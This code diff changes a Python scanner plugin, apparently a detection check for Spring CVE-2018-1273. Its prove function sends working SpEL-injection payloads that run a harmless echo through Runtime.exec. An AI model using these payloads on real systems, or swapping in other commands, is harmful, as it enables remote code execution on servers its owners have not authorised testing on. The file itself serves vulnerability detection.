@@ -2,18 +2,14 @@
 # -*- coding: utf-8 -*-
 __author__ = 'orleven'
 
-import urllib.parse
-import requests
-requests.packages.urllib3.disable_warnings()
-
-def get_script_info(data=None):
-    script_info = {
+def info(data=None):
+    info = {
         "name": "spring_cve_2018_1273",
         "info": "spring_cve_2018_1273.",
         "level": "high",
-        "type": "info"
+        "type": "rce"
     }
-    return script_info
+    return info
 
 def prove(data):
     data = init(data,'web')
@@ -23,7 +19,7 @@ def prove(data):
                 'username[#this.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\'echo%20spring_test\')")]=test',
                 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("echo%20spring_test")]=test']
             for _data in datas:
-                res = requests.get(data['url'], data = _data,headers=data['headers'], verify=False, timeout=data['timeout'])
+                res = curl('get',data['url'], data = _data)
                 if "spring_test" in res.text :
                     data['flag'] = 1
                     data['data'].append({"name": 'spring_cve_2018_1273'})
